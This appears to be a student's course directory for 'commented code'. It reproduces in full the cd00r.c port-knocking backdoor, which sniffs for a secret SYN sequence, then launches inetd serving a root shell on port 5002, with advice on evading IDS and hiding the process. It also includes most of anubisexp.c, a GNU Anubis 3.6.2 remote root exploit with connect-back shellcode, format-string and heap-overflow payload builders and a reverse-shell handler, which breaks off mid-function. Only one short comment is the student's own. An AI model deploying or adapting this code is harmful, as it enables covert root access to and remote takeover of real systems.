This directory will contain all the commented code that you will create throughout the course. For now, move the commented code for cd00r and sad00r into here.

# Commented Code

### cd00r 
/* cdoor.c 
 * packet coded backdoor
 * 
 * FX of Phenoelit <fx@phenoelit.de>
 * http://www.phenoelit.de/  
 * (c) 2k 
 *
 * $Id: cd00r.c,v 1.3 2000/06/13 17:32:24 fx Exp fx $
 *
 *
    'cd00r.c' is a proof of concept code to test the idea of a 
    completely invisible (read: not listening) backdoor server. 

    Standard backdoors and remote access services have one major problem: 
    The port's they are listening on are visible on the system console as 
    well as from outside (by port scanning).

    The approach of cd00r.c is to provide remote access to the system without 
    showing an open port all the time. This is done by using a sniffer on the 
    specified interface to capture all kinds of packets. The sniffer is not 
    running in promiscuous mode to prevent a kernel message in syslog and 
    detection by programs like AnitSniff. 
    To activate the real remote access service (the attached code starts an 
    inetd to listen on port 5002, which will provide a root shell), one has to 
    send several packets (TCP SYN) to ports on the target system. Which ports 
    in which order and how many of them can be defined in the source code.

    When port scanning the target, no open port will show up because there is 
    no service listening. After sending the right SYN packets to the system, 
    cd00r starts the listener and the port(s) is/are open. One nice side effect 
    is, that cd00r does not care whenever the port used as code is open or not. 
    Services running on ports used as code are still fully functional, but it's 
    not a very good idea to use these ports as explained later.

    The best way to send the required SYN packets to the system is 
    the use of nmap:
    ./nmap -sS -T Polite -p<port1>,<port2>,<port3>  <target>
    NOTE: the Polite timing ensures, that nmap sends the packets serial as
    defined.

    Details:
    Prevention of local detection is done by several things:
    First of all, the program gives no messages et all. It accepts only one 
    configurable command line option, which will show error messages for 
    the sniffer functions and other initialization stuff before 
    the first fork(). 
    All configuration is done in the first part of the source code as #defines. 
    This leaves the target system without configuration files and the process 
    does not show any command line options in the process table. When renaming 
    the binary file to something like 'top', it is nearly invisible.

    The sniffer part of the code uses the LBNL libpcap and it's good filter 
    functionality to prevent uninteresting traffic from entering the much 
    slower test functions. By selecting higher, usually not used, ports as 
    part of the code, the sniffer consumes nearly no processing time et all.

    Prevention of remote detection is primary the responsibility of the 
    'user'. By selecting more then 8 ports in changing order and in the 
    higher range (>20000), it is nearly impossible to brute force these 
    without rendering the system useless. 
    Several configurable options support the defense against remote attacks: 
    cd00r can look at the source address and (if defined) resets the code if 
    a packet from another location arrives. By not using this function, one 
    can activate the remote shell by sending the right packets from several 
    systems, hereby flying below the IDS radar. 
    Another feature is to reset or not reset the list of remaining ports 
    (code list), if a false packet arrives. On heavy loaded systems this 
    can happen often and would prevent the authorized sender to activate 
    the remote shell. Again, when flying below the IDS radar, such 
    functionality can be counterproductive because the usual way to 
    prevent detection by an IDS is to send packets with long delays. 

    What action cd00r actually takes is open to the user. The function 
    cdr_open_door() is called without any argument. It fork()s twice 
    to prevent zombies. Just add your code after the fork()s.

    The functionality outlined in these lines of terrific C source can 
    be used for booth sides of the security game. If you have a system 
    somewhere in the wild and you don't like to show open ports (except 
    the usual httpd ;-) to the world, you may consider some modifications, 
    so cd00r will provide you with a running ssh. 
    On the other hand, one may like to create a backchanel, therefor never
    providing any kind of listening port on the system.

    Even the use of TCP SYN packets is just an example. Using the sniffer,
    one can easily change the opening conditions to something like two SYN, one 
    ICMP echo request and five UDP packets. I personally like the TCP/SYN stuff
    because it has many possible permutations without changing the code.

 Compile it as:

 gcc -o <whatever> -I/where/ever/bpf -L/where/ever/bpf cd00r.c -lpcap

 of for some debug output:

 gcc -DDEBUG -o <whatever> -I/where/ever/bpf -L/where/ever/bpf cd00r.c -lpcap

 */


/* cd00r doesn't use command line arguments or a config file, because this 
 * would provide a pattern to look for on the target systems
 *
 * instead, we use #defines to specifiy variable parameters such as interface 
 * to listen on and perhaps the code ports
 */

/* the interface tp "listen" on */
#define CDR_INTERFACE		"eth0"
/* the address to listen on. Comment out if not desired 
 * NOTE: if you don't use CDR_ADDRESS, traffic FROM the target host, which 
 *       matches the port code also opens the door*/
/* #define CDR_ADDRESS		"192.168.1.1"  */

/* the code ports.
 * These are the 'code ports', which open (when called in the right order) the 
 * door (read: call the cdr_open_door() function).
 * Use the notation below (array) to specify code ports. Terminate the list
 * with 0 - otherwise, you really have problems.
 */
#define CDR_PORTS		{ 200,80,22,53,3,00 }

/* This defines that a SYN packet to our address and not to the right port 
 * causes the code to reset. On systems with permanent access to the internet
 * this would cause cd00r to never open, especially if they run some kind of 
 * server. Additional, if you would like to prevent an IDS from detecting your
 * 'unlock' packets as SYN-Scan, you have to delay them. 
 * On the other hand, not resetting the code means that
 * with a short/bad code the chances are good that cd00r unlocks for some 
 * random traffic or after heavy portscans. If you use CDR_SENDER_ADDR these
 * chances are less.
 * 
 * To use resets, define CDR_CODERESET 
 */
#define CDR_CODERESET

/* If you like to open the door from different addresses (e.g. to
 * confuse an IDS), don't define this.
 * If defined, all SYN packets have to come from the same address. Use
 * this when not defining CDR_CODERESET.
 */
#define CDR_SENDER_ADDR

/* this defines the one and only command line parameter. If given, cd00r
 * reports errors befor the first fork() to stderr.
 * Hint: don't use more then 3 characters to pervent strings(1) fishing
 */
#define CDR_NOISE_COMMAND	"noi"


/****************************************************************************
 * Nothing to change below this line (hopefully)
 ****************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/in.h>                 /* for IPPROTO_bla consts */
#include <sys/socket.h>                 /* for inet_ntoa() */
#include <arpa/inet.h>                  /* for inet_ntoa() */
#include <netdb.h>			/* for gethostbyname() */
#include <sys/types.h>			/* for wait() */
#include <sys/wait.h>			/* for wait() */

#include <pcap.h>
#include <net/bpf.h>

#define ETHLENGTH 	14
#define IP_MIN_LENGTH 	20
#define CAPLENGTH	98



struct iphdr {
        u_char  ihl:4,        /* header length */
        version:4;              /* version */
        u_char  tos;          /* type of service */
        short   tot_len;      /* total length */
        u_short id;           /* identification */
        short   off;          /* fragment offset field */
        u_char  ttl;          /* time to live */
        u_char  protocol;     /* protocol */
        u_short check;        /* checksum */
        struct  in_addr saddr;
	struct  in_addr daddr;  /* source and dest address */
};

struct tcphdr {
        unsigned short int 	src_port;
	unsigned short int 	dest_port;
        unsigned long int 	seq_num;
        unsigned long int 	ack_num;
	unsigned short int	rawflags;
        unsigned short int 	window;
        long int 		crc_a_urgent;
        long int 		options_a_padding;
};

/* the ports which have to be called (by a TCP SYN packet), before
 * cd00r opens 
 */
unsigned int 	cports[] = CDR_PORTS;
int		cportcnt = 0;
/* which is the next required port ? */
int		actport = 0;

#ifdef CDR_SENDER_ADDR
/* some times, looking at sender's address is desired.
 * If so, sender's address is saved here */
struct in_addr	sender;
#endif CDR_SENDER_ADDR

/********
 * cdr_open_door() is called, when all port codes match
 * This function can be changed to whatever you like to do when the system
 * accepts the code 
 ********/
void cdr_open_door(void) {
    FILE	*f;

    char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};

    switch (fork()) {
	case -1: 
#ifdef DEBUG
	    printf("fork() failed ! Fuck !\n");
#endif DEBUG
	    return;
	case 0: 
	    /* To prevent zombies (inetd-zombies look quite stupid) we do
	     * a second fork() */
	    switch (fork()) {
		case -1: _exit(0);
		case 0: /*that's fine */
			 break;
		default: _exit(0);
	    }
	     break;

	default: 
	     wait(NULL);
	     return;
    }

    if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
    fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
    fclose(f);

    execv("/usr/sbin/inetd",args);
#ifdef DEBUG
    printf("Strange return from execvp() !\n");
#endif DEBUG
    exit (0);

}


/* error function for pcap lib */
void capterror(pcap_t *caps, char *message) {
    pcap_perror(caps,message);
    exit (-1);
}

/* signal counter/handler */
void signal_handler(int sig) {
    /* the ugly way ... */
    _exit(0);
}

void *smalloc(size_t size) {
    void	*p;

    if ((p=malloc(size))==NULL) {
	exit(-1);
    }
    memset(p,0,size);
    return p;
}


/* general rules in main():
 * 	- errors force an exit without comment to keep the silence
 * 	- errors in the initialization phase can be displayed by a 
 * 	  command line option 
 */
int main (int argc, char **argv) {

    /* variables for the pcap functions */
#define	CDR_BPF_PORT 	"port "
#define CDR_BPF_ORCON	" or "
    char 		pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    pcap_t 		*cap;                       /* capture handler */
    bpf_u_int32 	network,netmask;
    struct pcap_pkthdr 	*phead;
    struct bpf_program 	cfilter;	           /* the compiled filter */
    struct iphdr 	*ip;
    struct tcphdr 	*tcp;
    u_char		*pdata;
    /* for filter compilation */
    char		*filter;
    char		portnum[6];
    /* command line */
    int			cdr_noise = 0;
    /* the usual int i */
    int			i;
    /* for resolving the CDR_ADDRESS */
#ifdef CDR_ADDRESS
    struct hostent	*hent;
#endif CDR_ADDRESS



    /* check for the one and only command line argument */
    if (argc>1) {
	if (!strcmp(argv[1],CDR_NOISE_COMMAND)) 
	    cdr_noise++;
	else 
	    exit (0);
    } 

    /* resolve our address - if desired */
#ifdef CDR_ADDRESS
    if ((hent=gethostbyname(CDR_ADDRESS))==NULL) {
	if (cdr_noise) 
	    fprintf(stderr,"gethostbyname() failed\n");
	exit (0);
    }
#endif CDR_ADDRESS

    /* count the ports our user has #defined */
    while (cports[cportcnt++]);
    cportcnt--;
#ifdef DEBUG
    printf("%d ports used as code\n",cportcnt);
#endif DEBUG

    /* to speed up the capture, we create an filter string to compile. 
     * For this, we check if the first port is defined and create it's filter,
     * then we add the others */
    
    if (cports[0]) {
	memset(&portnum,0,6);
	sprintf(portnum,"%d",cports[0]);
	filter=(char *)smalloc(strlen(CDR_BPF_PORT)+strlen(portnum)+1);
	strcpy(filter,CDR_BPF_PORT);
	strcat(filter,portnum);
    } else {
	if (cdr_noise) 
	    fprintf(stderr,"NO port code\n");
	exit (0);
    } 

    /* here, all other ports will be added to the filter string which reads
     * like this:
     * port <1> or port <2> or port <3> ...
     * see tcpdump(1)
     */
    
    for (i=1;i<cportcnt;i++) {
	if (cports[i]) {
	    memset(&portnum,0,6);
	    sprintf(portnum,"%d",cports[i]);
	    if ((filter=(char *)realloc(filter,
			    strlen(filter)+
			    strlen(CDR_BPF_PORT)+
			    strlen(portnum)+
			    strlen(CDR_BPF_ORCON)+1))
		    ==NULL) {
		if (cdr_noise)
		    fprintf(stderr,"realloc() failed\n");
		exit (0);
	    }
	    strcat(filter,CDR_BPF_ORCON);
	    strcat(filter,CDR_BPF_PORT);
	    strcat(filter,portnum);
	}
    } 

#ifdef DEBUG
    printf("DEBUG: '%s'\n",filter);
#endif DEBUG

    /* initialize the pcap 'listener' */
    if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
	if (cdr_noise)
	    fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
	exit (0);
    }

    /* open the 'listener' */
    if ((cap=pcap_open_live(CDR_INTERFACE,CAPLENGTH,
		    0,	/*not in promiscuous mode*/
		    0,  /*no timeout */
		    pcap_err))==NULL) {
	if (cdr_noise)
	    fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
	exit (0);
    }

    /* now, compile the filter and assign it to our capture */
    if (pcap_compile(cap,&cfilter,filter,0,netmask)!=0) {
	if (cdr_noise) 
	    capterror(cap,"pcap_compile");
	exit (0);
    }
    if (pcap_setfilter(cap,&cfilter)!=0) {
	if (cdr_noise)
	    capterror(cap,"pcap_setfilter");
	exit (0);
    }

    /* the filter is set - let's free the base string*/
    free(filter);
    /* allocate a packet header structure */
    phead=(struct pcap_pkthdr *)smalloc(sizeof(struct pcap_pkthdr));

    /* register signal handler */
    signal(SIGABRT,&signal_handler);
    signal(SIGTERM,&signal_handler);
    signal(SIGINT,&signal_handler);

    /* if we don't use DEBUG, let's be nice and close the streams */
#ifndef DEBUG
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);
#endif DEBUG

    /* go daemon */
    switch (i=fork()) {
	case -1:
	    if (cdr_noise)
		fprintf(stderr,"fork() failed\n");
	    exit (0);
	    break;	/* not reached */
	case 0:
	    /* I'm happy */
	    break;
	default:
	    exit (0);
    }

    /* main loop */
    for(;;) {
	/* if there is no 'next' packet in time, continue loop */
	if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
	/* if the packet is to small, continue loop */
	if (phead->len<=(ETHLENGTH+IP_MIN_LENGTH)) continue; 
	
	/* make it an ip packet */
	ip=(struct iphdr *)(pdata+ETHLENGTH);
	/* if the packet is not IPv4, continue */
	if ((unsigned char)ip->version!=4) continue;
	/* make it TCP */
	tcp=(struct tcphdr *)(pdata+ETHLENGTH+((unsigned char)ip->ihl*4));

	/* FLAG check's - see rfc793 */
	/* if it isn't a SYN packet, continue */
	if (!(ntohs(tcp->rawflags)&0x02)) continue;
	/* if it is a SYN-ACK packet, continue */
	if (ntohs(tcp->rawflags)&0x10) continue;

#ifdef CDR_ADDRESS
	/* if the address is not the one defined above, let it be */
	if (hent) {
#ifdef DEBUG
	    if (memcmp(&ip->daddr,hent->h_addr_list[0],hent->h_length)) {
		printf("Destination address mismatch\n");
		continue;
	    }
#else 
	    if (memcmp(&ip->daddr,hent->h_addr_list[0],hent->h_length)) 
		continue;
#endif DEBUG
	}
#endif CDR_ADDRESS

	/* it is one of our ports, it is the correct destination 
	 * and it is a genuine SYN packet - let's see if it is the RIGHT
	 * port */
	if (ntohs(tcp->dest_port)==cports[actport]) {
#ifdef DEBUG
	    printf("Port %d is good as code part %d\n",ntohs(tcp->dest_port),
		    actport);
#endif DEBUG
#ifdef CDR_SENDER_ADDR
	    /* check if the sender is the same */
	    if (actport==0) {
		memcpy(&sender,&ip->saddr,4);
	    } else {
		if (memcmp(&ip->saddr,&sender,4)) { /* sender is different */
		    actport=0;
#ifdef DEBUG
		    printf("Sender mismatch\n");
#endif DEBUG
		    continue;
		}
	    }
#endif CDR_SENDER_ADDR
	    /* it is the rigth port ... take the next one
	     * or was it the last ??*/
	    if ((++actport)==cportcnt) {
		/* BINGO */
		cdr_open_door();
		actport=0;
	    } /* ups... some more to go */
	} else {
#ifdef CDR_CODERESET
	    actport=0;
#endif CDR_CODERESET
	    continue;
	}
    } /* end of main loop */

    /* this is actually never reached, because the signal_handler() does the 
     * exit.
     */
    return 0;
}

/*
The program mainly sits and listens to another device in an undetected way.
It achieves this by not outputting a lot of information to the command line, and it also sorts interesting information from non-interesting information.
*/


### sad00r
/*
 * anubisexp.c
 *
 * GNU Anubis 3.6.2 remote root exploit by CMN
 *
 * <cmn at darklab.org>, <cmn at 0xbadc0ded.org>
 * Bug found by Ulf Harnhammar.
 *
 * 2004-03-10
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DUMMY            0x41414141
#define BUFSIZE          512
#define AUTH_PORT        113
#define ANUBIS_PORT      24
#define IP_INDEX         5
#define PORT_INDEX       11

#define PREV_INUSE       0x1
#define IS_MMAP          0x2
#define NON_MAIN_ARENA   0x4
#define FMTSTR           0x1
#define OVERFLOW         0x2

#define JMPCODE          "\xeb\x0c"

static int connect_target = 0;
static int start_auth = 0;

    /* Connect back */
static char linux_code[] =
    "\x31\xc0\x50\x50\x68\xc0\xa8\x01\x01\x66\x68\x30\x39\xb0\x02"
    "\x66\x50\x89\xe6\x6a\x06\x6a\x01\x6a\x02\x89\xe1\x31\xdb\x43"
    "\x30\xe4\xb0\x66\xcd\x80\x89\xc5\x6a\x10\x56\x55\x89\xe1\xb3"
    "\x03\xb0\x66\xcd\x80\x89\xeb\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
    "\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xd2\x52\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
    "\x0b\xcd\x80\x31\xc0\x40\xcd\x80";

    /* Connect back */
static char freebsd_code[] =
    "\x31\xc0\x50\x50\x68\xc0\xa8\x01\x01\x66\x68\x30\x39\xb4\x02"
    "\x66\x50\x89\xe2\x66\x31\xc0\x50\x40\x50\x40\x50\x50\x30\xe4"
    "\xb0\x61\xcd\x80\x89\xc7\x31\xc0\xb0\x10\x50\x52\x57\x50\xb0"
    "\x62\xcd\x80\x50\x57\x50\xb0\x5a\xcd\x80\xb0\x01\x50\x57\x50"
    "\x83\xc0\x59\xcd\x80\xb0\x02\x50\x57\x50\x83\xc0\x58\xcd\x80"
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
    "\x50\x53\x89\xe2\x50\x52\x53\x50\xb0\x3b\xcd\x80\x31\xc0\x40"
    "\x50\x50\xcd\x80";

struct target {
    char type;
    char *desc;
    char *code;
    u_int bufaddr;  /* static buf on line 266 in net.c, used by recv() */
    u_int retloc;
    u_int offset;
    u_int written;
    u_int pad;
};


struct target targets[] = {
    /* .GOT free */
    { OVERFLOW, "Linux anubis-3.6.2-1.i386.rpm [glibc < 3.2.0] (overflow)",
        linux_code, 0x08056520, 0x08056464, 305, 0x00, 0x00 },

    /* .GOT strlen */
    { FMTSTR, "Linux anubis-3.6.2-1.i386.rpm (fmt, verbose)", linux_code,
        0x08056520, 0x080563bc, 10*4, 32, 1 },

    /* .dtors */
    { FMTSTR, "FreeBSD anubis-3.6.2_1.tgz (fmt)", freebsd_code,
        0x805db80, 0x0805cc10+4, 12*4, 20, 1 },

    /* .GOT getpwnam */
    { FMTSTR, "FreeBSD anubis-3.6.2_1.tgz (fmt, verbose)", freebsd_code,
        0x805db80, 0x0805ce18, 15*4, 32, 1 },

    { -1, NULL, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
};


int
sock_connect(u_long ip, u_short port)
{
    struct sockaddr_in taddr;
    int sock_fd;

    memset(&taddr, 0x00, sizeof(struct sockaddr_in));
    taddr.sin_addr.s_addr = ip;
    taddr.sin_port = port;
    taddr.sin_family = AF_INET;

    if ( (sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("** socket()");
        return(-1);
    }

    if (connect(sock_fd, (struct sockaddr *)&taddr,
            sizeof(taddr)) < 0) {
        perror("** connect()");
        return(-1);
    }
    return(sock_fd);
}


long
net_inetaddr(u_char *host)
{
    long haddr;
    struct hostent *hent;

    if ( (haddr = inet_addr(host)) < 0) {
        if ( (hent = gethostbyname(host)) == NULL)
            return(-1);

        memcpy(&haddr, (hent->h_addr), 4);
    }
    return(haddr);
}

long
net_localip(void)
{
    u_char lname[MAXHOSTNAMELEN +1];
    struct in_addr addr;
    memset(lname, 0x00, sizeof(lname));

    if ( gethostname(lname, MAXHOSTNAMELEN) < 0)
        return(-1);

    addr.s_addr = net_inetaddr(lname);
    return(addr.s_addr);
}


char *
unlinkchunk(u_int ret, u_int retloc, size_t words)
{
    u_int *chunk;
    size_t i=0;

    if (words < 14) {
        fprintf(stderr, "unlinkchunk(): Small buffer\n");
        return(NULL);
    }

    if ( (chunk = calloc(words*sizeof(u_int)+1, 1)) == NULL) {
        perror("calloc()");
        return(NULL);
    }

    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = ret;
    chunk[i++] = retloc-8;

    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = -4;
    chunk[i++] = ret;
    chunk[i++] = retloc-8;

    for (; i<words; i++) {

        /* Relative negative offset to first chunk */
        if (i % 2)
            chunk[i] = ((-(i-8)*4) & ~(IS_MMAP|NON_MAIN_ARENA))|PREV_INUSE;
        /* Relative negative offset to second chunk */
        else
            chunk[i] = ((-(i-3)*4) & ~(IS_MMAP|NON_MAIN_ARENA))|PREV_INUSE;
    }
    return((char *)chunk);
}

int
mkfmtstr(struct target *tgt, u_int ret,
        char *buf, size_t buflen)
{
    size_t pad;
    size_t espoff;
    size_t written;
    int tmp;
    int wb;
    int i;

    if (buflen < 50) {
        fprintf(stderr, "mkfmtstr(): small buffer\n");
        return(-1);
    }
    memset(buf, 'P', tgt->pad % 4);
    buf += tgt->pad % 4;
    written = tgt->written;

    /* Add dummy/retloc pairs */
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc;
    buf += 8;
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc+1;
    buf += 8;
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc+2;
    buf += 8;
    *(u_long *)buf = DUMMY;
    *(u_long *)(buf +4) = tgt->retloc+3;
    buf += 8;
    buflen -= 32;
    written += 32;

    /* Stackpop */
    for (espoff = tgt->offset; espoff > 0; espoff -= 4) {
        snprintf(buf, buflen, "%%08x");
        buflen -= strlen("%08x");
        buf += strlen("%08x");
        written += 8;
    }

    /* Return address */
    for (i=0; i<4; i++) {
        wb = ((u_char *)&ret)[i] + 0x100;
        written %= 0x100;
        pad = (wb - written) % 0x100;
        if (pad < 10)
                pad += 0x100;
        tmp = snprintf(buf, buflen,
            "%%%du%%n", pad);
        written += pad;
        buflen -= tmp;
        buf += tmp;
    }

    return(buflen >= 0 ? written : -1);
}


int
evil_auth(u_short port, char *ident, size_t identlen)
{
    struct sockaddr_in client;
    struct sockaddr_in laddr;
    u_int addrlen = sizeof(struct sockaddr_in);
    int lsock, csock;
    char input[128];

    if ( (lsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("** socket()");
        return(-1);
    }

    memset(&laddr, 0x00, sizeof(struct sockaddr_in));
    laddr.sin_family = AF_INET;
    laddr.sin_port = port;
    laddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(lsock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
        perror("** bind()");
        return(-1);
    }

    if (listen(lsock, 1) < 0) {
        perror("** listen()");
        return(-1);
    }

    printf("[*] Awaiting auth connection\n");
    if ( (csock = accept(lsock, (struct sockaddr *)&client,
            &addrlen)) < 0) {
        fprintf(stderr, "** Connection error\n");
        return(-1);
    }

    if (getpeername(csock, (struct sockaddr *)&client, &addrlen) < 0)
        perror("** getpeername()");
    else
        printf("[*] %s:%u connected to auth\n",
            inet_ntoa(client.sin_addr), ntohs(client.sin_port));

    if (read(csock, input, sizeof(input)) <= 0) {
        perror("** write()");
        return(1);
    }

    printf("[*] Sending evil ident\n");

    if (write(csock, ident, identlen) != identlen) {
        perror("** write()");
        return(1);
    }

    if (close(csock) < 0 || close(lsock < 0)) {
        perror("** close()");
        return(1);
    }

    return(0);
}

void
signal_handler(int signo)
{
    if (signo == SIGUSR1) {
        start_auth++;
        connect_target++;
    }
    else if (signo == SIGALRM) {
        fprintf(stderr, "** Timed out while waiting for connect back\n");
        kill(0, SIGTERM);
        exit(EXIT_FAILURE);
    }
}


int
get_connectback(pid_t conn, int lsock)
{
    char inbuf[8192];
    u_int addrlen = sizeof(struct sockaddr_in);
    struct sockaddr_in client;
    int csock;
    fd_set readset;
    ssize_t n;
    int nfd;

    if (listen(lsock, 1) < 0) {
        perror("** listen()");
        return(-1);
    }

    /* Timeout */
    signal(SIGALRM, signal_handler);
    alarm(5);

    /* Signal connect */
    kill(conn, SIGUSR1);
    waitpid(conn, NULL, 0);

    printf("[*] Awaiting connect back\n");
    if ( (csock = accept(lsock, (struct sockaddr *)&client,
            &addrlen)) < 0) {
        fprintf(stderr, "** Connection error\n");
        return(-1);
    }
    alarm(0);
    printf("[*] Target connected back\n\n");
    wait(NULL); /* Reap of last child */
    write(csock, "id\n", 3);

    if ( (nfd = csock +1) > FD_SETSIZE) {
        fprintf(stderr, "** SASH Error: FD_SETSIZE to small!\r\n");
        return(1);
    }

    FD_ZERO(&readset);
    FD_SET(csock, &readset);
    FD_SET(STDIN_FILENO, &readset);

    for (;;) {
        fd_set readtmp;
        memcpy(&readtmp, &readset, sizeof(readtmp));
        memset(inbuf, 0x00, sizeof(inbuf));

        if (select(nfd, &readtmp, NULL, NULL, NULL) < 0) {
            if (errno == EINTR)
                continue;
            perror("select()");
            return(1);
        }

        if (FD_ISSET(STDIN_FILENO, &readtmp)) {
            if ( (n = read(STDOUT_FILENO, inbuf, sizeof(inbuf))) < 0) {
                perror("read()");
                break;
            }
            if (n == 0) break;
            if (write(csock, inbuf, n) != n) {
                perror("write()");
                return(1);
            }
        }

        if (FD_ISSET(csock, &readtmp)) {
            if ( (n = read(csock, inbuf, sizeof(inbuf))) < 0) {
                perror("read()");
                break;
            }
            if (n == 0) break;
            if (write(STDOUT_FILENO, inbuf, n) != n) {
                perror("write()");
                return(1);
            }
        }
    }
    return(0);
}


void
usage(char *pname)
{
    int i;

    printf("\nUsage: %s host[:port] targetID [Option(s)]\n", pname);
    printf("\n  Targets:\n");
    for (i=0; targets[i].desc != NULL; i++)
        printf("     %d   -   %s\n", i, targets[i].desc);
    printf("\n  Options:\n");
    printf("    -b ip[:port]  - Local connect back address\n");
    printf("    -l retloc     - Override target retloc\n");
    printf("    -r ret        - Override target ret\n");
    printf("    -w written    - Bytes written by target fmt func\n");
    printf("\n");
}


int
main(int argc, char *argv[])
{
    u_char buf[BUFSIZE+1];
    u_char fmt[220];
    char *chunk = NULL;
    struct sockaddr_in taddr;
    struct sockaddr_in laddr;
    u_short auth_port;
    struct target *tgt;
    pid_t pid1, pid2;
    u_int ret = 0;
    int lsock;
    char *pt;
    int i;


    printf("\n     GNU Anubis 3.6.2 remote root exploit by CMN\n");
    if (argc < 3) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");

    memset(&taddr, 0x00, sizeof(struct sockaddr_in));
    taddr.sin_port = htons(ANUBIS_PORT);
    taddr.sin_family = AF_INET;
    taddr.sin_addr.s_addr = INADDR_ANY;
    auth_port = htons(AUTH_PORT);

    memset(&laddr, 0x00, sizeof(struct sockaddr_in));
    laddr.sin_family = AF_INET;
    laddr.sin_port = 0;
    laddr.sin_addr.s_addr = net_localip();

    if ( (pt = strchr(argv[1], ':'))) {
        *pt++ = '\0';
        taddr.sin_port = htons((u_short)strtoul(pt, NULL, 0));
    }

    if ( (long)(taddr.sin_addr.s_addr = net_inetaddr(argv[1])) == -1) {
        fprintf(stderr, "Failed to resolve target host/IP\"%s\"\n", argv[1]);
         exit(EXIT_FAILURE);
    }
    argv++;
    argc--;

    i = strtoul(argv[1], NULL, 0);
    if (argv[1][0] == '-'|| (i<0) ||
             i>= sizeof(targets)/sizeof(struct target)-1) {
        fprintf(stderr, "** Bad target ID\n");
        exit(EXIT_FAILURE);
    }
    argv++;
    argc--;

    tgt = &targets[i];

    while ( (i = getopt(argc, argv, "r:l:w:b:")) != -1) {
        switch(i) {
            case 'b': {

                if ( (pt = strchr(optarg, ':'))) {
                    *pt++ = '\0';
                    laddr.sin_port = htons((u_short)strtoul(optarg,
                        NULL, 0));
                }

                if ( (long)(laddr.sin_addr.s_addr = net_inetaddr(optarg)) == -1) {
                    fprintf(stderr, "Failed to resolve target host/IP\"%s\"\n", optarg);
                    exit(EXIT_FAILURE);
                }
            }
            case 'r': ret = strtoul(optarg, NULL, 0); break;
            case 'l': tgt->retloc = strtoul(optarg, NULL, 0); break;
            case 'w': tgt->written = strtoul(optarg, NULL, 0); break;
            default: exit(EXIT_FAILURE);
        }
    }


    /* Local address */
    if ( (lsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("** socket()");
        exit(EXIT_FAILURE);
    }

    if (bind(lsock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
        perror("** bind()");
        exit(EXIT_FAILURE);
    }

    /* Connect back address */
    {
        int len = sizeof(struct sockaddr_in);
        struct sockaddr_in paddr;
        if (getsockname(lsock, (struct sockaddr *)&paddr, &len) < 0) {
            perror("** getsockname()");
            exit(EXIT_FAILURE);
        }
        (*(u_short *)&tgt->code[PORT_INDEX]) = paddr.sin_port;
        (*(u_int *)&tgt->code[IP_INDEX]) = paddr.sin_addr.s_addr;

        printf("local addr: %s:%u\n", inet_ntoa(paddr.sin_addr),
            ntohs(paddr.sin_port));

        if (!(paddr.sin_port & 0xff00) || !(paddr.sin_port & 0xff00) ||
            !(paddr.sin_addr.s_addr & 0xff000000) ||
            !(paddr.sin_addr.s_addr & 0x00ff0000) ||
            !(paddr.sin_addr.s_addr & 0x0000ff00) ||
            !(paddr.sin_addr.s_addr & 0x000000ff)) {
            fprintf(stderr, "** Zero byte(s) in connect back address\n");
            exit(EXIT_FAILURE);
        }
    }

    /*
     * We insert a '\n' to control the size of the data
     * passed on the the vulnerable function.
     * But all 512 bytes are read into a static buffer, so we
     * just add the shellcode after '\n' to store it.
     */
    if (tgt->type == FMTSTR) {
        if (!ret)
            ret = tgt->bufaddr+260;

        if (mkfmtstr(tgt, ret, fmt, sizeof(fmt)) < 0)
            exit(EXIT_FAILURE);
        memset(buf, 0x90, sizeof(buf));
        memcpy(&buf[BUFSIZE-strlen(tgt->code)-4],
            tgt->code, strlen(tgt->code)+1);
        i = snprintf(buf, sizeof(buf), "a: USERID: a: %s\n", fmt);
        if (buf[i] == '\0') buf[i] = 0x90;
    }
    else {

        if (!ret)
            ret = tgt->bufaddr+tgt->offset+24;
        memset(buf, 0x90, sizeof(buf));

        memcpy(&buf[sizeof(buf)-strlen(tgt->code)-4],
            tgt->code, strlen(tgt->code)+1);

        if ( (chunk = unlinkchunk(ret, tgt->retloc, 64/4)) == NULL)
            exit(EXIT_FAILURE);

        i = snprintf(buf, sizeof(buf), "a: USERID: a:   %s", chunk);
        if (buf[i] == '\0') buf[i] = 0x90;

        /* Set free address */
        *((u_int *)&buf[tgt->offset]) = tgt->bufaddr + 68;

        /* Return point */
